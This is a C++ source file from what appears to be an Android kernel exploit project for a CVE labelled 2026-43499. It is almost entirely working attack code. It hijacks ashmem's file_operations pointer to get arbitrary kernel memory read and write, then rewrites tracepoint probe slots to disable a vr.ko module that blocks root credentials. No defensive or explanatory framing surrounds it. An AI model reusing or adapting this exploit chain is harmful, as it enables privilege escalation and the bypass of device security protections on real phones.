/*
 * CFI stage implementation. See cfi_stage.hpp for the design contract, the
 * lifecycle rules and the Neo11Plus source locations this ports.
 *
 * Step numbering follows the upstream `cfi_last_step` values so a device log
 * can be read against the original payload:
 *   cfi1 = 11  open /dev/ashmem failed
 *   cfi2 = 4   punch missed: &ashmem_misc.fops did not become fake_fops
 *   cfi3 = 1   hijack write never formed (attack_write unverified)
 *   cfi4 = 2/3 llseek repair or the 8-byte kernel read/write self-check failed
 *   cfi5 = 5/6 registering the resident fd failed
 *   cfi  = 0   stage complete
 * A single boolean would lose the distinction between "the write missed" and
 * "the write landed but the page is unusable", which is what decides whether a
 * device retries the write or re-sprays the page.
 */

#include "session/backend/cfi_stage.hpp"

#include "session/backend/cfi_layout.hpp"

/* The hijack's one attacker-side write goes through the backend's shared write
 * primitive. This unit is compiled into the same binary, and including the
 * backend header here is what makes `Cve2026_43499Policy` complete: the backend
 * .cpp includes this header first, and the guard keeps it a single definition. */
#include "session/backend/cve_2026_43499_backend.hpp"

#include "attack/ops.hpp"
#include "common.h"
#include "kernel/constants.hpp"
#include "kernel/target.h"
#include "profile/accessors.hpp"
#include "route/route_policy.hpp"
#include "support/decls.hpp"
#include "support/run_state.hpp"

#include <array>
#include <cstring>
#include <fcntl.h>
#include <unistd.h>

namespace ghostlock::session::backend {
    namespace {
        /* Single resident channel: one stage run per process, on the attack
         * thread, and the fd must outlive the stage. */
        CfiKernelRw g_cfi_kernel_rw{};

        /* ASHMEM_SET_NAME takes a NUL-terminated char[256]; the encoders in
         * cfi_layout.hpp produce exactly the 128-byte prefix that matters. */
        constexpr int32_t kAshmemSetName = _IOW(0x77, 1, char[256]);
        constexpr size_t kAshmemNameLen = 256;

        [[nodiscard]] bool set_private_data(int32_t fd,
                                            const unsigned char *blob) {
            std::array<char, kAshmemNameLen> name{};
            // NOLINTNEXTLINE(bugprone-not-null-terminated-result) blob is shorter
            ::memcpy(name.data(), blob, kShapeBlobSize);
            errno = 0;
            return ::ioctl(fd, kAshmemSetName, name.data()) == 0;
        }

        /* Commit the write shape: the next `pwrite` lands at `target`. */
        [[nodiscard]] bool shape_private_data(int32_t fd, uintptr_t target) {
            if (target == 0) return false;
            const auto blob = build_shape_write_blob(target);
            return set_private_data(fd, blob.data());
        }

        /* Commit the read shape: the next `pread` at read_pos(len) reads
         * `target`. */
        [[nodiscard]] bool shape_private_data_for_read(int32_t fd, uintptr_t target,
                                                       size_t len) {
            if (target == 0 || len == 0 || len > kAshmemPrefixCount) return false;
            const auto blob = build_shape_read_blob(target, len);
            return set_private_data(fd, blob.data());
        }
    } // namespace

    bool cfi_symbols_from_profile(const ExploitSession &session, CfiSymbols &out) noexcept {
        out = CfiSymbols{};
        if (!session.profile.loaded()) return false;

        out.ashmem_ioctl = profile::ashmem_ioctl_image();
        out.ashmem_compat_ioctl = profile::ashmem_compat_ioctl_image();
        out.ashmem_mmap = profile::ashmem_mmap_image();
        out.ashmem_open = profile::ashmem_open_image();
        out.ashmem_release = profile::ashmem_release_image();
        out.ashmem_show_fdinfo = profile::ashmem_show_fdinfo_image();
        out.copy_splice_read = profile::copy_splice_read_image();
        out.configfs_bin_read_iter = profile::configfs_bin_read_iter_image();
        out.configfs_bin_write_iter = profile::configfs_bin_write_iter_image();
        out.ashmem_fops = profile::ashmem_fops_image();
        /* Patched by the first resident write; seed it with the real function so
         * the table is complete even before the repair runs. */
        out.llseek_after_erase = profile::noop_llseek_image();
        /* vr.ko probe neutralisation (step 3). These stay zero on a profile
         * without them, and `vr_neutralize_ready()` then reports false. */
        out.sys_exit_tp = profile::sys_exit_tp_image();
        out.commit_creds_tp = profile::rvh_commit_creds_tp_image();
        out.tracepoint_probestub_off = profile::tracepoint_probestub_off();
        out.tracepoint_funcs_off = profile::tracepoint_funcs_off();
        out.tracepoint_func_stride = profile::tracepoint_func_stride();
        out.vr_commit_to_sysexit_delta = profile::vr_commit_to_sysexit_delta();
        out.kernel_image_lo = kernel::KIMAGE_TEXT_BASE;
        /* The image's real extent is not in the profile; `vr_kernel_image_max`
         * is a size bound and is deliberately used as-is (the check only has to
         * separate "inside the kernel image" from "inside a module", and the
         * modules are mapped far below the image). */
        const uint64_t image_max = profile::vr_kernel_image_max();
        out.kernel_image_hi = image_max != 0 ? kernel::KIMAGE_TEXT_BASE + image_max : 0;

        if (!out.complete()) {
            pr_warning("CFI: a required fops-hijack symbol is missing from the "
                       "profile kernel section\n");
            out = CfiSymbols{};
            return false;
        }
        return true;
    }

    Status CfiKernelRw::write(uintptr_t target, const void *bytes, size_t size) const noexcept {
        if (fd < 0 || bytes == nullptr || size == 0) return false;
        if (!shape_private_data(fd, target)) return false;
        errno = 0;
        const ssize_t written = ::pwrite(fd, bytes, size, 0);
        return written == static_cast<ssize_t>(size);
    }

    Status CfiKernelRw::read(uintptr_t target, void *bytes, size_t size) const noexcept {
        if (fd < 0 || bytes == nullptr || size == 0) return false;
        if (!shape_private_data_for_read(fd, target, size)) return false;
        const off_t pos = static_cast<off_t>(read_pos(size));
        errno = 0;
        const ssize_t got = ::pread(fd, bytes, size, pos);
        return got == static_cast<ssize_t>(size);
    }

    Status CfiKernelRw::write64(uintptr_t target, uint64_t value) const noexcept {
        return write(target, &value, sizeof(value));
    }

    bool CfiKernelRw::read64(uintptr_t target, uint64_t &out) const noexcept {
        out = 0;
        return read(target, &out, sizeof(out));
    }

    bool CfiKernelRw::repair_llseek(uintptr_t noop_llseek) const noexcept {
        if (fd < 0 || fake_fops == 0 || noop_llseek == 0) return false;
        const uintptr_t slot = fake_fops + static_cast<uintptr_t>(kLlseekSlotOff);
        if (!write64(slot, noop_llseek)) return false;
        uint64_t readback = 0;
        if (!read64(slot, readback)) return false;
        return readback == noop_llseek;
    }

    CfiKernelRw cfi_kernel_rw() noexcept {
        return g_cfi_kernel_rw;
    }

    VrNeutralizeReport neutralize_vr_probes(const CfiKernelRw &channel,
                                            const CfiSymbols &symbols) noexcept {
        VrNeutralizeReport report{};
        if (!channel.valid()) {
            pr_warning("vr neutralize: no resident channel\n");
            return report;
        }
        if (!symbols.vr_neutralize_ready()) {
            pr_warning("vr neutralize: profile is missing the tracepoint constants "
                       "(sys_exit/commit_creds/probestub/funcs/stride/delta/image); "
                       "skipped\n");
            return report;
        }

        const uintptr_t lo = symbols.kernel_image_lo;
        const uintptr_t hi = symbols.kernel_image_hi;
        const uintptr_t sys_exit = session::g_exploit_session.addresses.data_alias(symbols.sys_exit_tp);
        const uintptr_t commit_creds =
                session::g_exploit_session.addresses.data_alias(symbols.commit_creds_tp);
        if (sys_exit == 0 || commit_creds == 0 ||
            !attack::in_direct_map(sys_exit) || !attack::in_direct_map(commit_creds)) {
            pr_warning("vr neutralize: tracepoints are not in the direct map "
                       "(sys_exit=0x%016zx commit_creds=0x%016zx)\n", sys_exit, commit_creds);
            return report;
        }

        /* The no-op every tracepoint carries. Redirecting a probe to it is what
         * "neutralised" means here; it is the kernel's own function, so KCFI and
         * the tracepoint unwinder are both happy. */
        uint64_t probestub = 0;
        if (!channel.read64(sys_exit + symbols.tracepoint_probestub_off, probestub) ||
            probestub == 0 || !image_contains_address(probestub, lo, hi)) {
            pr_warning("vr neutralize: implausible probestub=0x%016zx (image "
                       "[0x%016zx,0x%016zx)); check the tracepoint offsets\n",
                       probestub, lo, hi);
            return report;
        }

        /* A helper that walks one tracepoint's funcs[] through the resident
         * read. `data_alias` is not applied to `funcs` here because the kernel
         * stores a linear address in that field already. */
        const auto read_linear = [&channel](uintptr_t address, uintptr_t &value) {
            return channel.read64(address, value);
        };
        const auto funcs_of = [&](uintptr_t tp, uintptr_t &funcs) {
            uint64_t raw = 0;
            if (!channel.read64(tp + symbols.tracepoint_funcs_off, raw)) return false;
            if (raw == 0 || !attack::in_direct_map(raw)) return false;
            funcs = static_cast<uintptr_t>(raw);
            return true;
        };

        /* Step 1: the module-region probes on commit_creds. vr.ko hooks it to
         * veto root, so it is the one tracepoint we know it is on. */
        uintptr_t cc_funcs = 0;
        if (!funcs_of(commit_creds, cc_funcs)) {
            pr_warning("vr neutralize: commit_creds funcs[] not usable; skipped\n");
            return report;
        }
        uintptr_t cc_probes[kMaxModuleProbes] = {};
        const size_t cc_count = collect_module_probes(
            read_linear, cc_funcs, symbols.tracepoint_func_stride, lo, hi, cc_probes);
        report.commit_creds_probes = static_cast<int32_t>(cc_count);
        pr_info("vr neutralize: probestub=0x%016zx commit_creds module probes=%zu\n",
                probestub, cc_count);
        if (cc_count == 0) {
            pr_info("vr neutralize: no module probe on commit_creds; vr.ko not "
                    "loaded (or not hooking it)\n");
            return report;
        }

        /* Step 2: find the matching sys_exit probe by the fixed intra-module
         * delta, redirect it, verify. Matching by delta is what keeps the kernel's
         * own sys_exit consumers (perf, BPF) untouched: only a slot whose address
         * is exactly vr's own commit_creds probe + delta is rewritten. */
        uintptr_t se_funcs = 0;
        if (!funcs_of(sys_exit, se_funcs)) {
            pr_warning("vr neutralize: sys_exit funcs[] not usable; skipped\n");
            return report;
        }
        for (size_t i = 0; i < cc_count; ++i) {
            const uintptr_t expected = cc_probes[i] - symbols.vr_commit_to_sysexit_delta;
            for (size_t index = 0; index < kTracepointFuncScanMax; ++index) {
                const uintptr_t slot = se_funcs + index * symbols.tracepoint_func_stride;
                uintptr_t func = 0;
                if (!channel.read64(slot, func)) break;
                if (func == 0) break;
                if (func != expected) continue;
                if (image_contains_address(func, lo, hi)) break;  /* not a module probe */
                if (!channel.write64(slot, probestub)) break;
                uint64_t after = 0;
                const bool ok = channel.read64(slot, after) && after == probestub;
                pr_info("vr neutralized: sys_exit slot=0x%016zx func 0x%016zx->0x%016zx "
                        "probestub=0x%016zx cc_probe=0x%016zx ok=%d\n",
                        slot, func, after, probestub, cc_probes[i], ok ? 1 : 0);
                if (ok) report.neutralized += 1;
                break;
            }
        }

        if (report.neutralized != 0) return report;

        /* Step 3: the fixed delta did not match. Either this vr.ko build spaces
         * its two probes differently, or the module was reloaded. Fall back to
         * redirecting every module-region probe on sys_exit -- and say so, so a
         * device log never makes this look like the precise path succeeded. */
        report.used_fallback = true;
        uintptr_t se_probes[kMaxModuleProbes] = {};
        const size_t se_count = collect_module_probes(
            read_linear, se_funcs, symbols.tracepoint_func_stride, lo, hi, se_probes);
        pr_warning("vr neutralize: no sys_exit probe matched commit_creds - 0x%llx; "
                   "falling back to all %zu module-region sys_exit probes\n",
                   static_cast<unsigned long long>(symbols.vr_commit_to_sysexit_delta),
                   se_count);
        for (size_t i = 0; i < se_count; ++i) {
            /* Locate the slot by address: collect_module_probes returned values,
             * so re-walk to find the slot holding it. */
            for (size_t index = 0; index < kTracepointFuncScanMax; ++index) {
                const uintptr_t slot = se_funcs + index * symbols.tracepoint_func_stride;
                uintptr_t func = 0;
                if (!channel.read64(slot, func)) break;
                if (func == 0) break;
                if (func != se_probes[i]) continue;
                if (!channel.write64(slot, probestub)) break;
                uint64_t after = 0;
                const bool ok = channel.read64(slot, after) && after == probestub;
                pr_info("vr neutralized(fallback): sys_exit slot=0x%016zx "
                        "func 0x%016zx->0x%016zx ok=%d\n",
                        slot, func, after, ok ? 1 : 0);
                if (ok) report.neutralized += 1;
                break;
            }
        }
        if (report.neutralized == 0) {
            pr_info("vr neutralize: no module-region probe on sys_exit either; "
                    "vr.ko absent\n");
        }
        return report;
    }

    template <class M>
    Status run_cfi_stage(ExploitSession &session) {
        /* Geometry guard: `WriteMode::Fops` stores the table address computed
         * from the non-compact 6.6 payload page. The compact arm overwrites the
         * same three words with different values, and the tcp layout moves them,
         * so under either the address we would store is not the address that
         * ends up in &ashmem_misc.fops. Refuse instead of writing a page pointer
         * to the wrong place. */
        if (session.profile.has_compact_waiter()) {
            pr_warning("CFI: compact waiter payload geometry; skipping fops hijack\n");
            return false;
        }
        if (route::route_capability(session.profile, [](auto policy) {
                return std::decay_t<decltype(policy)>::tcp_payload_layout;
            })) {
            pr_warning("CFI: tcp payload geometry; skipping fops hijack\n");
            return false;
        }

        CfiSymbols symbols{};
        if (!cfi_symbols_from_profile(session, symbols)) {
            pr_warning("CFI: kernel section is missing the fops hijack constants; "
                       "stage skipped\n");
            return false;
        }
        const uintptr_t misc_fops_img = profile::ashmem_misc_fops_image();
        const uintptr_t misc_fops = session.addresses.data_alias(misc_fops_img);
        const uintptr_t real_fops = session.addresses.data_alias(symbols.ashmem_fops);
        if (misc_fops == 0 || real_fops == 0 || !attack::in_direct_map(misc_fops)) {
            pr_warning("CFI: ashmem_misc.fops alias 0x%016zx is not in the direct map; "
                       "stage skipped\n", misc_fops);
            return false;
        }
        pr_info("CFI: &ashmem_misc.fops=0x%016zx ashmem_fops=0x%016zx\n",
                misc_fops, real_fops);

        /* cfi1: open the device. Every read/write below goes through this fd,
         * whose file->f_op is snapshotted here — before the hijack — which is
         * exactly why the hijack reaches it afterwards. */
        support::run_state::enter("cfi1");
        const int32_t fd = ::open("/dev/ashmem", O_RDWR | O_CLOEXEC);
        if (fd < 0) {
            pr_error("CFI: open /dev/ashmem failed errno=%d\n", errno);
            return false;
        }
        support::run_state::complete("cfi1");

        CfiKernelRw channel{};
        channel.fd = fd;

        /* NOTE: nothing may be read or written through this fd before the
         * hijack. `file->f_op` is still ashmem_fops, so a `pread` would land in
         * `ashmem_read_iter` (no configfs semantics) and a `pwrite` would fail
         * outright — ashmem defines no write_iter at all. The upstream payload
         * has the same shape: its post-hijack self-check is what it trusts.
         *
         * Likewise there is no pre-hijack "dead-man" shape of
         * `&ashmem_misc.fops`: that write would itself have to go through this
         * fd. The value that arrives is fixed before the write instead — it is
         * the table address inside the page the spray will hand us. */

        /* cfi2: the one attack write. `Fops` stores the page-resident forged
         * table address into `misc_fops`. */
        const memory::WriteRequest request = memory::WriteRequest::make(
            misc_fops, memory::WriteMode::Fops, false);
        support::run_state::enter("cfi2");
        if (!Cve2026_43499Policy::template attack_write<M>(session, request, "CFI: fops hijack")) {
            pr_error("CFI: hijack write failed; page was not installed\n");
            support::run_state::complete("cfi2");
            ::close(fd);
            return false;
        }
        support::run_state::complete("cfi2");

        /* cfi3: read the field back. It can only be `fake_fops` if the erase
         * really took the "child == NULL, left != NULL" arm with rb_left ==
         * misc_fops and rb_parent_color == fake_fops, so this one read verifies
         * the encoding *and* the punch at the same time. */
        support::run_state::enter("cfi3");
        const uintptr_t page_base = (session.heap.current.base);
        const uintptr_t fake_fops = page_base +
                                    static_cast<uintptr_t>(memory::kFakeFopsTableOffset);
        channel.fake_fops = fake_fops;
        uint64_t observed = 0;
        if (!channel.read64(misc_fops, observed) || observed != fake_fops) {
            pr_error("CFI: hijack readback 0x%016zx, expected fake_fops 0x%016zx "
                     "(page base 0x%016zx, errno=%d)\n",
                     observed, fake_fops, page_base, errno);
            support::run_state::complete("cfi3");
            ::close(fd);
            return false;
        }
        pr_info("CFI: &ashmem_misc.fops(0x%016zx) -> fake_fops 0x%016zx "
                "(page base 0x%016zx)\n", misc_fops, fake_fops, page_base);

        /* Put the forged table into the page. Doing it after the write keeps
         * this on the page the write actually landed in: the erase's own store
         * of `node->__rb_parent_color` into `fake_fops + 0x8` (the llseek slot)
         * is corrected right after, which is the point of `repair_llseek`. */
        std::span<unsigned char> page{
            reinterpret_cast<unsigned char *>(page_base),
            static_cast<size_t>(kernel::ORDER3_SIZE),
        };
        if (!build_fake_fops_table(page, fake_fops, symbols)) {
            pr_error("CFI: forged fops table does not fit page 0x%016zx\n",
                     (session.heap.current.base));
            support::run_state::complete("cfi3");
            ::close(fd);
            return false;
        }
        support::run_state::complete("cfi3");

        /* cfi4: llseek slot repair + the 8-byte kernel read/write self-check.
         * The slot is corrupt by construction (rb_erase writes rb_right over
         * it), so this write is required, and its read-back is the first proof
         * that arbitrary 8-byte kernel memory access works at all. */
        support::run_state::enter("cfi4");
        if (!channel.repair_llseek(profile::noop_llseek_image())) {
            pr_error("CFI: llseek repair failed errno=%d (page 0x%016zx may be "
                     "clobbered)\n", errno, (session.heap.current.base));
            support::run_state::complete("cfi4");
            ::close(fd);
            return false;
        }
        pr_success("CFI: resident kernel read/write ready (fake_fops=0x%016zx, "
                   "llseek repaired and verified)\n", fake_fops);
        support::run_state::complete("cfi4");

        /* cfi5: register the resident channel. No page ownership moves with it:
         * the kernel borrows the page through file->f_op, so `session.heap`
         * must not replace it while this fd is open (see cfi_stage.hpp). */
        support::run_state::enter("cfi5");
        g_cfi_kernel_rw = channel;
        support::run_state::complete("cfi5");

        /* vr1: global vr.ko probe neutralisation (integration-plan step 3A).
         * With the channel in place this costs a handful of reads and one write,
         * which is the whole reason the CFI stage comes first. Failure is not
         * fatal: the per-task tag clearing already got the victim child through
         * W2, so the run continues and only later root processes are at risk. */
        support::run_state::enter("vr1");
        const VrNeutralizeReport vr = neutralize_vr_probes(channel, symbols);
        if (vr.neutralized > 0) {
            pr_success("vr.ko sys_exit probe neutralised (%d slot(s)%s)\n",
                       vr.neutralized, vr.used_fallback ? ", fallback path" : "");
        } else {
            pr_warning("vr.ko sys_exit probe not neutralised (commit_creds module "
                       "probes=%d); later root processes may still be killed\n",
                       vr.commit_creds_probes);
        }
        support::run_state::complete("vr1");

        support::run_state::complete("cfi");
        return true;
    }

    template Status run_cfi_stage<route::SelectPolicy>(ExploitSession &);
    template Status run_cfi_stage<route::TcpPolicy>(ExploitSession &);
    template Status run_cfi_stage<route::MulticastPolicy>(ExploitSession &);
} // namespace ghostlock::session::backend
